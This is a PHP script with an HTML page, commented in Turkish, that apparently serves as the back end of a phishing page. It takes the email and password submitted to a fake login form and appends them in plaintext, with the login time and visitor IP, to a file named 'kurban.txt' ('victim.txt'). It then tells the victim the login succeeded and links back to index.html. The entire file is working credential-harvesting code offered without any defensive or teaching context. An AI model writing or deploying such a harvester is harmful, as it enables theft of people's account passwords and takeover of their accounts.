<?php
// Hata mesajı için değişken
$error_message = '';

// Kullanıcıların giriş bilgilerini kaydetmek için dosya yolu
$log_file = 'kurban.txt';

// POST isteği ile formdan gelen verileri alıyoruz
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // E-posta ve şifre değişkenlerini alıyoruz, XSS saldırılarını engellemek için htmlspecialchars kullanıyoruz.
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Eğer e-posta veya şifre boş ise hata mesajını güncelleyelim
    if (empty($email) || empty($password)) {
        $error_message = 'Lütfen e-posta ve şifre alanlarını doldurun!';
    } else {
        // Giriş tarihini ve zaman dilimini alıyoruz
        date_default_timezone_set('Europe/Istanbul'); // Zaman dilimini ayarla (İstanbul için örnek)
        $login_time = date('Y-m-d H:i:s'); // Tarih ve zaman dilimi formatı

        // Kullanıcının bilgilerini kaydetme işlemi
        $log_message = "E-Posta: $email - Şifre: $password - Giriş Zamanı: $login_time - IP: " . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
        
        // Dosyaya bilgileri ekleme
        file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

        // Başarılı giriş durumu
        $error_message = 'Giriş başarılı!';
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gelişmiş Giriş Formu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .message-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
            animation: fadeInDown 0.5s ease-out;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .btn-retry {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .btn-retry:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="message-container animate__animated animate__bounceInDown">
        <?php if (!empty($error_message)): ?>
            <div class="error-message"><?php echo $error_message; ?></div>
            <button class="btn-retry" onclick="redirectToLogin()">Tekrar Dene</button>
        <?php endif; ?>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // jQuery ile sayfayı logine yönlendirme işlevi
        function redirectToLogin() {
            setTimeout(function() {
                window.location.href = "index.html"; // login.php sayfasına yönlendir
            }, 1000); // 1 saniye bekledikten sonra yönlendir
        }
    </script>
</body>
</html>
